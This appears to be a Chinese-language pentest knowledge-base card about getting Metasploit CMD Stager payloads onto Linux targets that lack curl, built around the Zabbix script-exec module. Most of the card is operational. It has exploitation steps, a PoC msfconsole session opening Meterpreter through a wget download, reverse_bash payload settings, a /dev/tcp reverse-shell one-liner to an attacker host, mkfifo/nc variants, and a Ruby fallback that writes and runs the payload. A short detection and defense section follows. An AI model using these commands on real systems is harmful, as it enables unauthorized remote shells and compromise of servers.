---
id: tools-metasploit-cmdstager-flavor-no-downloader
title: Metasploit CMD Stager 无下载器环境适配：按模块可用 flavor 切换传输
type: scenario
domain: tools
path: tools/metasploit
technique: msf-cmdstager-flavor-selection
aliases:
- CMDSTAGER::FLAVOR
- MSF 无 curl
- CMD Stager 传输
- Meterpreter 落地失败
- wget flavor
- echo/printf stager
- zabbix_script_exec
tags:
- metasploit
- msf
- cmdstager
- payload-delivery
- meterpreter
- reverse-shell
- linux
- tooling
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V73
  verified_at: '2026-11-05T16:38:23+08:00'
  notes: 已对照原文核对：图01 默认 auto 下 zabbix_script_exec 停在 'Executing the script...' 无会话；图02 Zabbix Scripts 中 msf 生成的 curl 下载/chmod/执行命令；图03 set CMDSTAGER::FLAVOR wget 后 Wget 请求 payload 并打开 Meterpreter session 1。卡内 flavor 列表（auto/tftp/wget/curl/fetch/lwprequest/psh_invokewebrequest/ftp_http）、'flavor 由模块显式注册、zabbix_script_exec 不支持 echo/printf' 与原文第 3 节结论一致，替代方案与源码 fallback 示例也对应原文。未验证点：未复跑 msf；原文未给 Metasploit 版本，未设 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

Metasploit 的 CMD Stager 在目标缺少 curl 时会直接失败；解决顺序不是盲目换 payload，而是先确认该模块注册了哪些 stager flavor，再 `set CMDSTAGER::FLAVOR wget`（或 tftp/fetch），或在无下载器时改用 `cmd/unix/reverse_bash` 直接反弹；框架支持 echo/printf 不代表当前模块支持。

## 原理

- CMD Stager 是 MSF 用来把 payload 分步传输到目标并执行的抽象层：模块在 `execute_cmdstager` 中声明 `flavor:` 列表，框架据此生成下载+chmod+执行+清理的命令（如 `curl -so /tmp/xxx http://attacker/payload; chmod +x /tmp/xxx; /tmp/xxx; rm -f /tmp/xxx`）。
- `CMDSTAGER::FLAVOR=auto` 时框架按目标平台和模块假设选择第一个可用方式；许多 Linux Dropper 模块默认假设存在 curl/wget，目标缺少对应命令时，脚本执行阶段直接报错或无回显，Meterpreter 会话不会建立。
- flavor 的可选值由模块显式注册，不是全局能力。以 `exploit/multi/http/zabbix_script_exec` 为例，只注册 auto、tftp、wget、curl、fetch、lwprequest、psh_invokewebrequest、ftp_http；即使 MSF 框架本身有 echo/printf 写文件 flavor，该模块也不会接受 `set CMDSTAGER::FLAVOR echo`。
- 无下载器时的替代路径：echo/printf 把 Base64/十六进制分块写入文件（只依赖 shell 内建，适合小 payload，大文件慢且易超时）；`cmd/unix/reverse_bash` 或 `cmd/unix/generic` 直接用 `/dev/tcp`、`nc`、`mkfifo` 反弹，完全跳过文件落地。
- 长期复用时可以改模块源码，在 `execute_cmdstager` 失败时 fallback 到 Base64+shell 写文件，或自定义一个不依赖外部工具的 stager；这比每次手工调整更稳定。
- 判断失败原因的关键是区分“模块没有跑通漏洞”和“stager 落地失败”：前者没有命令执行回显，后者通常能在目标命令输出/日志中看到 curl/wget 不存在或下载超时。

## 触发条件

- 使用带 CMD Stager 的 MSF exploit 模块，且目标已获得命令执行但缺少 curl/wget 等下载器。
- 模块的 `execute_cmdstager` 只注册了有限 flavor，auto 选择的方式在目标不可用。
- 目标有可用的替代传输方式（wget/tftp/fetch）或可直接执行反弹 shell 的 shell（bash/nc）。
- 攻击机可被目标访问（HTTP/TFTP 服务端口），或改用目标主动外连的反弹模式。

## 利用步骤

1. 在 msfconsole 中查看模块信息与选项：`info`、`show options`、`show advanced`；确认 `CMDSTAGER::FLAVOR` 的可选值与默认 `auto`。
2. 查看模块源码中注册的 flavor 列表与 `execute_cmdstager`：
   ```bash
   grep -n "flavor\|CmdStager\|execute_cmdstager" modules/exploits/<path>/<module>.rb
   ```
3. 在已获得的命令执行通道探测目标工具：`command -v curl wget tftp fetch nc bash sh`；根据结果选择 flavor。
4. 显式指定可用下载器并重跑：
   ```text
   set CMDSTAGER::FLAVOR wget
   run
   ```
   若目标是 Windows，可试 `psh_invokewebrequest`、`certutil`、`bitsadmin`。
5. 若一个下载器都没有，改用不落地的反弹 payload：
   ```text
   set PAYLOAD cmd/unix/reverse_bash
   set LHOST <attacker>
   set LPORT 4444
   run
   ```
   或 `cmd/unix/generic` 手工填 `bash -i >& /dev/tcp/<attacker>/4444 0>&1` / `mkfifo` + `nc`。
6. 需要长期复用时，给模块加 fallback：`execute_cmdstager` 抛错时用 Base64 分块写入 `/tmp/p`，`chmod +x` 后执行；注意大 payload 的分块数量与命令长度限制。
7. 用 `sessions -l` / `sessions -i <id>` 确认会话建立；若仍失败，回到第 3 步确认目标是否真的能执行命令、是否能出网。

## PoC

```text
msf6 > use exploit/multi/http/zabbix_script_exec
msf6 exploit(multi/http/zabbix_script_exec) > set RHOSTS <target>
msf6 exploit(multi/http/zabbix_script_exec) > set LHOST <attacker>
msf6 exploit(multi/http/zabbix_script_exec) > set CMDSTAGER::FLAVOR wget
msf6 exploit(multi/http/zabbix_script_exec) > run
[*] Started reverse TCP handler on <attacker>:4444
[+] Successfully logged in
[*] Using URL: http://<attacker>:9999/<random>
[*] Client <target> (Wget/1.21) requested /<random>
[*] Sending payload to <target> (Wget/1.21)
[*] Meterpreter session 1 opened (<attacker>:4444 -> <target>:xxxxx)
meterpreter >
```

```text
# 无任何下载器时，直接反弹（不落地文件）
msf6 > set PAYLOAD cmd/unix/reverse_bash
msf6 > set LHOST <attacker>
msf6 > set LPORT 4444
msf6 > run
```

```ruby
# 模块源码 fallback 示例（示意，需按模块上下文调整）
def execute_cmdstager(opts = {})
  super
rescue StandardError
  print_status('Falling back to base64 write')
  execute_command("echo '#{Rex::Text.encode_base64(payload.encoded)}' | base64 -d > /tmp/p; chmod +x /tmp/p; /tmp/p")
end
```

## 变体与关联

- 变体：Linux flavor 还包括 tftp、fetch、lwprequest、ftp_http、echo、printf、bourne；Windows 包括 `psh_invokewebrequest`、certutil、bitsadmin。不同模块注册集合不同，必须以 `info`/源码为准。
- 变体：无下载器但目标有 `base64`/`xxd`/`openssl` 时，可用分块编码写文件；有 `python`/`perl`/`php` 时可用其 socket 或 HTTP 客户端拉取。
- 变体：完全无文件落地时可使用内存执行（如 Java 的 FFM/mmap、.NET 的 Assembly.Load、PowerShell 反射加载），或直接使用反向 shell 而非 Meterpreter。
- 关联：[[pentest-lateral-movement-ssh-no-pty-semi-interactive-shell]]（受限 shell 下的交互技巧）、[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]（Java 命令执行与反弹 shell 构造）、[[pentest-lateral-movement-ms17-010-eternalblue-psexec]]（MSF 另一类模块利用）。
- 边界：目标完全无出网、无 shell 内建写文件能力、命令长度严格受限、或模块不暴露任何自定义 stager 时，仍需先解决漏洞入口或改用其他投递方式；echo/printf 对大 payload 易超时，不能替代下载器。

## 检测与防御

- **检测**：Web/主机日志出现 curl/wget/tftp/fetch 下载临时文件后 chmod+执行；进程树中 Web 服务或应用进程派生 `sh -c`、`curl`、`wget`；临时目录出现随机名可执行文件；与攻击机 IP 的 4444/9999 等端口连接；MSF stager 的随机 URL 路径与固定 User-Agent（如 Wget/curl）。
- **防御**：出站流量白名单，禁止服务器主动访问互联网；移除或限制 curl/wget/tftp；应用进程最小权限与只读文件系统；EDR 监控 “下载→chmod→执行→删除” 行为链；禁用不必要的命令执行入口。
- **加固**：对 Web 应用 RCE 漏洞及时修补；临时目录 noexec；容器禁止出网；集中审计临时文件创建与执行。
